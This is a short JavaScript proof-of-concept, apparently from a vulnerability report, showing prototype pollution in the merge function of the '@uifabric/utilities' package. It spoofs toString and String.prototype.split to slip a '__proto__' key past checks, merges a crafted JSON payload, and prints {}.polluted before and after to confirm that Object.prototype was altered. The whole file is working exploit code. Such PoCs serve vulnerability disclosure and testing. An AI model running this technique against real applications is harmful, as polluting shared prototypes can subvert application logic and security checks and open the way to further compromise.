var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const util = require('@uifabric/utilities');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
const source2 = { k3: {} };
console.log({}.polluted);
y = util.merge(source2, JSON.parse(malicious_payload));
console.log({}.polluted);